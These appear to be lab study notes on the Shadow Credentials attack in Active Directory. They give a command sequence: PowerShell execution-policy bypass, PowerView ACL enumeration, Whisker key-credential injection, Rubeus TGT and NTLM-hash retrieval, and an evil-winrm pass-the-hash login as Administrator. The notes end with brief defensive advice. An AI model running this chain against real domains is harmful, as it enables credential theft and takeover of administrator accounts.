## Table of Contents

  - [Table of Contents](#Table\of\Contents)
        - [Notes~](#Notes~)
          - [Objectives](#Objectives)
  - [Understanding Active Directory](#Understanding\Active\Directory)
  - [Windows Hello for Business (WHfB)](#Windows\Hello\for\Business\(WHfB))
  - [Enumeration with PowerView](#Enumeration\with\PowerView)
  - [Exploiting GenericWrite Privilege](#Exploiting\GenericWrite\Privilege)
  - [Obtaining TGT with Rubeus](#Obtaining\TGT\with\Rubeus)
  - [Conducting Pass-the-Hash Attack](#Conducting\Pass-the-Hash\Attack)
  - [Conclusion](#Conclusion)

## Table of Contents

        - [Notes~](#Notes~)
          - [Objectives](#Objectives)
  - [Understanding Active Directory](#Understanding\Active\Directory)
  - [Windows Hello for Business (WHfB)](#Windows\Hello\for\Business\(WHfB))
  - [Enumeration with PowerView](#Enumeration\with\PowerView)
  - [Exploiting GenericWrite Privilege](#Exploiting\GenericWrite\Privilege)
  - [Obtaining TGT with Rubeus](#Obtaining\TGT\with\Rubeus)
  - [Conducting Pass-the-Hash Attack](#Conducting\Pass-the-Hash\Attack)
  - [Conclusion](#Conclusion)


##### Notes~
`msDS-KeyCredentialLink` is an attribute used by the Domain Controller to store the public key in WHfB for enrolling a new user device such a computer. In short, each user object in the Active Directory database will have its public key stored in this unique attribute

1. (TPM) - Public-Private key pair generation: The TPM creates a public-private key pair for the user's account when they enroll. It's crucial to remember that the private key never leaves the TPM and is never disclosed.
2. Client certificate request



###### Objectives
- Understanding Active Directory
- Introduction to Windows Hello for Business
- Prerequisites for exploiting GenericWrite privilege
- How the Shadow Credentials attack works
- How to exploit the vulnerability
## Understanding Active Directory
- **AD**: A centralized authentication system in Windows environments.
- **Domain Controller (DC)**: Manages data storage, authentication, and authorization ithin a domain.
## Windows Hello for Business (WHfB)
- Replaces traditional passwords with cryptographic keys.
- Uses **msDS-KeyCredentialLink** attribute in AD to store public keys.
- Authentication process involves authorization, certificate generation, and authentication.
## Enumeration with PowerView
1. **Navigate to Tools Directory**:
`cd C:\Users\hr\Desktop`
2. **Bypass Execution Policy**:
`powershell -ep bypass`
3. **Load PowerView Script**:
`. .\PowerView.ps1`
4. **Enumerate Privileges**:
`Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights`
## Exploiting GenericWrite Privilege
1. **Using Whisker**:
- Add command:
 `.\Whisker.exe add /target:VULNERABLE_USER`
- Replace `VULNERABLE_USER` with the target user from enumeration.
## Obtaining TGT with Rubeus

1. **Generate TGT Request**:
- Use the output from Whisker to create the command.
- Syntax:
`Rubeus.exe asktgt /user:USER /certificate:CERT /password:PASSWORD /domain:DOMAIN /dc:DOMAIN_CONTROLLER /getcredentials /show`

- Replace `USER`, `CERT`, `PASSWORD`, `DOMAIN`, and `DOMAIN_CONTROLLER` with appropriate values.
## Conducting Pass-the-Hash Attack
1. **Using Evil-WinRM**:
    - Command: `evil-winrm -i MACHINE_IP -u Administrator -H NTLM_HASH`
    - Replace `MACHINE_IP` and `NTLM_HASH` with the target machine's IP and the NTLM hash obtained.
## Conclusion
- Emphasize the principle of least privilege in AD.
- Regularly audit and review permissions to prevent such vulnerabilities.

